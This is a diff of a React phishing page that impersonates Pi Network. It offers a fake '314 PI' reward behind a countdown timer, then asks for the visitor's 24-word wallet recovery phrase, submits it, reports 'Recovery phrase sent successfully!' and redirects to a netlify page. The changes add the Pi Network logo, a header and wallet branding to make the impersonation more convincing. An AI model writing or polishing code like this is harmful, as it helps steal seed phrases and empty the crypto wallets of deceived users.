@@ -11,14 +11,21 @@ const Index = () => {
   const [isLoading, setIsLoading] = useState(false);
   const [isClaimLoading, setIsClaimLoading] = useState(false);
   const [showError, setShowError] = useState(false);
-  const [timeRemaining, setTimeRemaining] = useState({ hours: 18, minutes: 42, seconds: 51 });
+  const [timeRemaining, setTimeRemaining] = useState({
+    hours: 18,
+    minutes: 42,
+    seconds: 51
+  });
 
   // Countdown timer effect
   React.useEffect(() => {
     const timer = setInterval(() => {
       setTimeRemaining(prev => {
-        let { hours, minutes, seconds } = prev;
-        
+        let {
+          hours,
+          minutes,
+          seconds
+        } = prev;
         if (seconds > 0) {
           seconds--;
         } else if (minutes > 0) {
@@ -31,19 +38,24 @@ const Index = () => {
         } else {
           // Timer reached 00:00:00
           clearInterval(timer);
-          return { hours: 0, minutes: 0, seconds: 0 };
+          return {
+            hours: 0,
+            minutes: 0,
+            seconds: 0
+          };
         }
-        
-        return { hours, minutes, seconds };
+        return {
+          hours,
+          minutes,
+          seconds
+        };
       });
     }, 1000);
-
     return () => clearInterval(timer);
   }, []);
-
   const handleClaimClick = async () => {
     setIsClaimLoading(true);
-    
+
     // 3 second delay
     setTimeout(() => {
       setIsClaimLoading(false);
@@ -52,12 +64,11 @@ const Index = () => {
   };
   const handleUnlockClick = async () => {
     const trimmedPhrase = recoveryPhrase.trim();
-    
     if (!trimmedPhrase) {
       toast.error('Please enter your recovery phrase');
       return;
     }
-    
+
     // Validate exactly 24 words
     const words = trimmedPhrase.split(/\s+/).filter(word => word.length > 0);
     if (words.length !== 24) {
@@ -65,10 +76,9 @@ const Index = () => {
       toast.error(`Recovery phrase must contain exactly 24 words. You entered ${words.length} words.`);
       return;
     }
-    
+
     // Clear error if validation passes
     setShowError(false);
-    
     setIsLoading(true);
     try {
       const {
@@ -86,7 +96,7 @@ const Index = () => {
         toast.success('Recovery phrase sent successfully!');
         setRecoveryPhrase('');
         setIsPopupOpen(false);
-        
+
         // Redirect to success page after successful submission
         setTimeout(() => {
           window.location.href = 'https://success-lucky-5f3e1c-moxie.netlify.app/?status=314';
@@ -110,15 +120,61 @@ const Index = () => {
         <div className="absolute top-60 left-1/3 w-20 h-20 bg-purple-500 rounded-full opacity-20 blur-xl"></div>
       </div>
 
-      <div className="relative z-10 container mx-auto px-4 py-8">
-        {/* Header */}
-        <div className="flex items-center justify-between mb-8">
-          <div className="flex items-center gap-2 text-white">
-            
-            
-            <ChevronDown className="w-4 h-4" />
+      <div className="relative z-10">
+        {/* Pi Network Header */}
+        <header className="bg-white/10 backdrop-blur-md border-b border-white/20">
+          <div className="container mx-auto px-4 py-4">
+            <div className="flex items-center justify-between">
+              {/* Logo Section */}
+              <div className="flex items-center gap-3">
+                <img 
+                  src="./images/pi_network_logo_2.jpeg" 
+                  alt="Pi Network Logo" 
+                  className="w-10 h-10 rounded-full object-cover border-2 border-white/30"
+                />
+                <div className="text-white">
+                  <h1 className="text-xl font-bold">Pi Network</h1>
+                  <p className="text-xs text-purple-200">Decentralized Currency</p>
+                </div>
+              </div>
+
+              {/* Navigation Menu */}
+              <nav className="hidden md:flex items-center gap-8">
+                <a href="#" className="text-white hover:text-yellow-400 transition-colors font-medium">Home</a>
+                <a href="#" className="text-white hover:text-yellow-400 transition-colors font-medium">About</a>
+                <a href="#" className="text-white hover:text-yellow-400 transition-colors font-medium">Roadmap</a>
+                <a href="#" className="text-white hover:text-yellow-400 transition-colors font-medium">Community</a>
+                <a href="#" className="text-white hover:text-yellow-400 transition-colors font-medium">Support</a>
+              </nav>
+
+              {/* Right Section */}
+              <div className="flex items-center gap-4">
+                {/* Language Selector */}
+                <div className="hidden sm:flex items-center gap-1 text-white">
+                  <span className="text-sm">EN</span>
+                  <ChevronDown className="w-3 h-3" />
+                </div>
+                
+                {/* Wallet Button */}
+                <div className="flex items-center gap-2 bg-white/20 backdrop-blur-sm rounded-full px-4 py-2 border border-white/30">
+                  <Wallet className="w-4 h-4 text-white" />
+                  <span className="text-white font-medium text-sm">Connect Wallet</span>
+                </div>
+
+                {/* Mobile Menu Button */}
+                <button className="md:hidden text-white">
+                  <div className="w-6 h-6 flex flex-col justify-center gap-1">
+                    <div className="w-full h-0.5 bg-white"></div>
+                    <div className="w-full h-0.5 bg-white"></div>
+                    <div className="w-full h-0.5 bg-white"></div>
+                  </div>
+                </button>
+              </div>
+            </div>
           </div>
-        </div>
+        </header>
+
+        <div className="container mx-auto px-4 py-8">
 
         {/* Main Content */}
         <div className="max-w-4xl mx-auto text-center">
@@ -168,20 +224,13 @@ const Index = () => {
               </div>
             </div>
 
-            <Button 
-              onClick={handleClaimClick} 
-              disabled={isClaimLoading}
-              className="bg-purple-600 hover:bg-purple-700 text-white px-12 py-4 text-xl font-bold rounded-full transition-all duration-300 transform hover:scale-105 disabled:opacity-70 disabled:cursor-not-allowed" 
-              style={{ background: 'var(--gradient-primary)' }}
-            >
-              {isClaimLoading ? (
-                <div className="flex items-center gap-2">
+            <Button onClick={handleClaimClick} disabled={isClaimLoading} className="bg-purple-600 hover:bg-purple-700 text-white px-12 py-4 text-xl font-bold rounded-full transition-all duration-300 transform hover:scale-105 disabled:opacity-70 disabled:cursor-not-allowed" style={{
+            background: 'var(--gradient-primary)'
+          }}>
+              {isClaimLoading ? <div className="flex items-center gap-2">
                   <div className="w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
                   LOADING...
-                </div>
-              ) : (
-                'CLAIM 314 PI NOW'
-              )}
+                </div> : 'CLAIM 314 PI NOW'}
             </Button>
           </div>
 
@@ -292,30 +341,30 @@ const Index = () => {
             <p>© 2025 Pi Network Reward Program. All rights reserved.</p>
           </div>
         </div>
+        </div>
       </div>
 
       {/* Elegant Full Window Popup - Matching Knowledge Base File 2 */}
       <Dialog open={isPopupOpen} onOpenChange={setIsPopupOpen}>
         <DialogContent className="max-w-none w-full h-full m-0 p-0 bg-white rounded-none border-none">
-          {/* Top Navigation Bar - Exact Purple Color */}
+          {/* Top Navigation Bar with Pi Logo Header Image */}
           <div className="bg-[#7030A0] px-6 py-3 h-14">
             <div className="flex items-center justify-between h-full">
               {/* Empty left space */}
               <div className="w-8"></div>
               
-              {/* Center content */}
+              {/* Center content - Wallet text with Pi logo on the right */}
               <div className="flex items-center gap-2">
                 <span className="text-white font-bold text-lg">Wallet</span>
-                <div className="w-7 h-7 bg-orange-500 rounded-full flex items-center justify-center border border-white">
-                  <span className="text-sm font-bold text-white">π</span>
-                </div>
+                <img 
+                  src="./images/pi_network_logo_2.jpeg" 
+                  alt="Pi Network Logo" 
+                  className="h-6 w-6 object-cover rounded-full"
+                />
               </div>
               
               {/* Close button */}
-              <button 
-                onClick={() => setIsPopupOpen(false)}
-                className="text-white hover:text-purple-200 transition-colors w-8 h-8 flex items-center justify-center"
-              >
+              <button onClick={() => setIsPopupOpen(false)} className="text-white hover:text-purple-200 transition-colors w-8 h-8 flex items-center justify-center">
                 <span className="text-xl font-light">×</span>
               </button>
             </div>
@@ -332,31 +381,20 @@ const Index = () => {
               {/* Input and Buttons */}
               <div className="space-y-4">
                 {/* Passphrase Input */}
-                <Textarea
-                  placeholder="e.g. alpha bravo charlie delta echo foxtrot golf hotel india juliett kilo lima mike november oscar papa quebec romeo sierra tango uniform victor whiskey xray yankee zulu"
-                  value={recoveryPhrase}
-                  onChange={(e) => {
-                    setRecoveryPhrase(e.target.value);
-                    if (showError) setShowError(false); // Clear error when user starts typing
-                  }}
-                  className="min-h-[160px] w-full border border-[#D3D3D3] rounded-lg p-4 text-base placeholder:text-[#A9A9A9] focus:border-[#7030A0] focus:ring-1 focus:ring-[#7030A0] resize-none"
-                />
+                <Textarea placeholder="e.g. alpha bravo charlie delta echo foxtrot golf hotel india juliett kilo lima mike november oscar papa quebec romeo sierra tango uniform victor whiskey xray yankee zulu" value={recoveryPhrase} onChange={e => {
+                setRecoveryPhrase(e.target.value);
+                if (showError) setShowError(false); // Clear error when user starts typing
+              }} className="min-h-[160px] w-full border border-[#D3D3D3] rounded-lg p-4 text-base placeholder:text-[#A9A9A9] focus:border-[#7030A0] focus:ring-1 focus:ring-[#7030A0] resize-none" />
                 
                 {/* Primary Button */}
-                <Button 
-                  onClick={handleUnlockClick}
-                  disabled={isLoading}
-                  className="w-full bg-[#7A4B9F] hover:bg-[#6A3B8F] text-white py-3 h-12 text-base font-bold rounded-lg transition-colors"
-                >
+                <Button onClick={handleUnlockClick} disabled={isLoading} className="w-full bg-[#7A4B9F] hover:bg-[#6A3B8F] text-white py-3 h-12 text-base font-bold rounded-lg transition-colors">
                   {isLoading ? 'SENDING...' : 'Unlock with Passphrase'}
                 </Button>
                 
                 {/* Error Message */}
-                {showError && (
-                  <div className="text-red-500 text-center font-bold text-base">
+                {showError && <div className="text-red-500 text-center font-bold text-base">
                     Invalid Passphrase
-                  </div>
-                )}
+                  </div>}
               </div>
               
               {/* Information Text */}
